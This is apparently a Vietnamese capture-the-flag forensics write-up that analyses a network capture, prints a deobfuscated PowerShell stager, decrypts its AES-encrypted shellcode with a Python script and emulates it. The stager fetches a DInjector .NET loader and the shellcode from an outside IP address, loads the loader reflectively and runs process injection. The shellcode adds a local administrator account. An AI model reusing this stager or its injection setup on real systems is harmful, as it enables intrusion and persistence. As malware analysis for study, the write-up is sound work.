# Red Failure 
## CHALLENGE DESCRIPTION
During a recent red team engagement one of our servers got compromised. Upon completion the red team should have deleted any malicious artifact or persistence mechanism used throughout the project. However, our engineers have found numerous of them left behind. It is therefore believed that there are more such mechanisms still active. Can you spot any, by investigating this network capture?

## Tools use
- WireShark
- Cyberchef 
- DnSpy
- scdbgc.exe
- DiE

# Analysis
Giải nén file ta được file sau:
```
.
├── Red Failure
│   ├── capture.pcap

```
## WireShark
### capture.pcap
![image](https://hackmd.io/_uploads/H1qtBILCyl.png)

### HTTP protocol
![image](https://hackmd.io/_uploads/SyoB48LC1x.png)

Khi phân tích, ta thấy có ba traffic thực hiện tải xuống 3 file từ `147.182.172.189`. Ta có thể tải xuống và xem nội dung file 

#### 4A7xH.ps1
![image](https://hackmd.io/_uploads/BJFbIILRJl.png)

Ta có thể dùng chatGPT nhờ nó deobfuscate
:::spoiler 4A7xH.ps1
```
sV  ('YuE51') ([typE]("SySTeM.REFLEcTIOn.aSSemblY"));  
${a} = 'currentthread'
${B} = ("147.182.172.189")
${C} = 80
${D} = ('user32.dll')
${E} = ('9tVI0')
${f} = ('z64&Rx27Z$B%73up')
${g} = 'C:\Windows\System32\svchost.exe'
${h} = ('notepad')
${I} = ('explorer')
${j} = ('msvcp_win.dll')
${k} = ('True')
${l} = ('True')

${MeThODS} = @(("remotethread"), ("remotethreaddll"), ("remotethreadview"), ("remotethreadsuspended"))
if (${m`E`ThOdS}.("Contains").Invoke('currentthread')) {
    ${h} = (&("Start-Process") -WindowStyle ("Hidden") -PassThru 'notepad')."Id"
}

${ME`ThODS} = @(("remotethreadapc"), ('remotethreadcontext'), ("processhollow"))
if (${m`EthODS}.("Contains").Invoke('currentthread')) {
    try {
        ${I} = (&('Get-Process') ${I} -ErrorAction ("Stop"))."ID"
    }
    catch {
        ${I} = 0
    }
}

${cMD} = currentthread /sc:http://147.182.172.189:80/9tVI0 /password:z64&Rx27Z$B%73up /image:C:\Windows\System32\svchost.exe /pi
d:notepad /ppid:explorer /dll:msvcp_win.dll /blockDlls:True /am51:True

${dAtA} = (.('IWR') -UseBasicParsing "http://147.182.172.189:80/user32.dll")."ContEnT" # should be Invoke-WebRequest
${AssEM} =  ( ls ("vaRIaBLe:yUE51")  )."VaLUe"::('Load').Invoke(${dAtA})

${fLAGS} = [Reflection.BindingFlags] ("NonPublic,Static")

${clASs} = ${asSEm}.("GetType").Invoke(("DInjector.Detonator"), ${flAgS})
${EnTRY} = ${ClASS}.('GetMethod').Invoke(('Boom'), ${fLAGS})

${EntRY}."INVokE"(${nULL}, ('Split').Invoke(" ")))
```
:::

Về nội dung, `4A7xH.ps1` sẽ tải xuống một cái gì đó từ `147.182.172.189`, ở đây là `9TVI0` và `user32.dll` và dường như cố gắng chạy chúng. Khi nhìn lại file PCAP trong Wireshark một lần nữa, hai packet còn lại của giao thức HTTP chính là hai file này 

#### 9tVI0
![image](https://hackmd.io/_uploads/SyFsdULCkx.png)

#### user32.dll
Sử dụng Detect It Easy, và ta biết được nó là chương trình .NET -> sử dụng DnSpy để debug

![image](https://hackmd.io/_uploads/HJel2QDUR1e.png)

## DnSpy
![image](https://hackmd.io/_uploads/r1BhmDLAkl.png)

Đây là command ps khi chạy nó 
```
${clASs} = ${asSEm}.(“GetType”).Invoke((“DInjector.Detonator”), ${flAgS})${EnTRY} = ${ClASS}.(‘GetMethod’).Invoke((‘Boom’), ${fLAGS})
```

![image](https://hackmd.io/_uploads/HyEB4vUAJl.png)

Ở hàm Decrypt chú ý thấy `AES(password).Decrypt(data)`. Và biến input `data` truyền vào chính là file `9tVI0` 

![image](https://hackmd.io/_uploads/rkmY4vLRyg.png)

Hàm decrypt sẽ trông như thế này

![image](https://hackmd.io/_uploads/B1VnNwIAye.png)

Về IV key, nó sử dụng 16 byte đầu của data. Sau đó sử dụng CBC. Về phần passwored ta lấy được từ command ps đó là `z64&Rx27Z$B%73up`

![image](https://hackmd.io/_uploads/rJdDHDI0Jg.png)

Từ dữ liệu trên ta sẽ có được code decrypt file 
:::spoiler Code decrypt 
```python
import hashlib
from Crypto.Cipher import AES

def sha256_hash(password: str) -> bytes:
    return hashlib.sha256(password.encode()).digest()

def decrypt_aes(file_path: str, password: str) -> bytes:
    with open(file_path, "rb") as f:
        data = f.read()
    
    key = sha256_hash(password)
    iv, encrypted_data = data[:16], data[16:]
    
    cipher = AES.new(key, AES.MODE_CBC, iv)
    decrypted_data = cipher.decrypt(encrypted_data)
    
    # Loại bỏ padding PKCS7
    pad_len = decrypted_data[-1]
    return decrypted_data[:-pad_len]

# Đọc và giải mã dữ liệu từ file
file_path = "9tVI0"
password = "z64&Rx27Z$B%73up"
decrypted_content = decrypt_aes(file_path, password)

# Ghi ra file a.txt
with open("a.txt", "wb") as f:
    f.write(decrypted_content)

# In nội dung file ra màn hình
with open("a.txt", "r", errors="ignore") as f:
    print(f.read())
```
:::

Sau khi decrypt ta sẽ nhận lại được 1 file khác. Nếu để ý kỹ ở phần debug ta cũng biết được nó là 1 shellcode

![image](https://hackmd.io/_uploads/BJ8zIDI01g.png)

## scdbgc.exe
> scdbgc.exe là một công cụ phân tích shellcode được phát triển bởi David Zimmer. Nó dựa trên thư viện mô phỏng libemu để mô phỏng và phân tích hành vi của shellcode trong môi trường Windows, mục đích để giúp các nhà phân tích bảo mật hiểu rõ hơn về cách hoạt động của shellcode mà không cần chạy chúng trên hệ thống thực tế. Nó hiển thị các lời gọi API của Windows mà shellcode cố gắng thực hiện, giúp xác định hành vi tiềm ẩn độc hại.

Chạy file scdbgc.exe
```powershell
scdbgc.exe /f redfailure.sc
```
![image](https://hackmd.io/_uploads/SJFdUPUAJg.png)

Từ nội dung hiển thị được ta thấy shellcode này đang cố inject net command để add user jmiller vào nhóm admin.
